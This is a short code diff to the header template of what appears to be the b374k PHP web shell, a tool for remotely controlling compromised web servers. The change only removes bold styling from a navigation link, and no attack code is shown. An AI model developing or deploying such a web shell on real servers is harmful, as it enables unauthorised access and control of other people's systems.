@@ -25,7 +25,7 @@
 	<div id='header'>
 		<!--header info start-->
 		<div id='headerNav'>
-			<span><a style='font-weight:bold;' onclick="set_cookie('cwd', '');" href='<?php echo get_self(); ?>'><?php echo $GLOBALS['title']." ".$GLOBALS['ver']?></a></span>
+			<span><a onclick="set_cookie('cwd', '');" href='<?php echo get_self(); ?>'><?php echo $GLOBALS['title']." ".$GLOBALS['ver']?></a></span>
 			<img onclick='viewfileorfolder();' id='b374k' src='<?php echo get_resource('b374k');?>' />
 			<span id='nav'><?php echo $nav; ?></span>
 
